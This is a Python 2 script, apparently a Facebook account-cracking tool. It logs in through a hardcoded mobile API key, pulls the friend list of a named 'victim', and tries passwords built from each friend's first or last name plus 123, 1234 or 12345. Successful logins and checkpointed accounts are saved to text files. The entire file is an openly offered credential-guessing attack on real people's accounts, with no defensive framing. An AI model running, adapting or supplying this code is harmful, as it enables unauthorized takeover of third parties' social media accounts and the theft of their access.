import os
import sys
import json
import requests
import mechanize
import cookielib
import urllib
import getpass
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
username = raw_input("[ x ] Enter The FB Username :")
password = getpass.getpass("[ x ] Enter The FB Password :")
idt = raw_input("[ x ] Enter The Victim ID   :")
login = br.open("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email="+(username)+"&locale=en_US&password="+(password)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
login_data = json.load(login)
login_data = login_data['access_token']
ss = open(".session.txt","w")
ss.write(login_data)
ss.close()
ss_tk = open(".session.txt")
myid = ss_tk.read()
idl = []
id_login = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+myid)
ids = json.loads(id_login.text)
for acc in ids['data']:
  idl.append(acc['id'])
for a in idl:
  id_log = requests.get("https://graph.facebook.com/"+a+"?access_token="+myid)
  log = json.loads(id_log.text)
  password_list = [log['first_name']+"123", log['first_name']+"1234",log['first_name']+"12345",log['last_name']+"123",log['last_name']+"1234",log['last_name']+"12345"]  
  for lpass in password_list:
    print("|"+str(log['name'])+" | "+str(lpass)+"|")
    data = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+a+"&locale=en_US&password="+lpass+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
    if '{"session_key":' in data.text:
      print(20*"-"+"\n[ x ]"+a+"\n[ x ]"+lpass+"\t"+"\n"+20*"-"+"\n")
      print("Successfull [ x ] "+a+" [ x ] "+lpass+" [ x ] ")
      s = open("Successful.txt","a")
      s.write(+a+" | "+lpass+"\n")
      s.close()
    elif 'www.facebook.com' in data.text:
      print(20*"-"+"\n[ x ]"+a+"\n[ x ]"+lpass+"\n"+20*"-"+"\n")
      print("[ x ] Account on checkpoint [ x ]")
      s = open("Checkpoint.txt","a")
      s.write(a+" | "+lpass+"\n")
      s.close()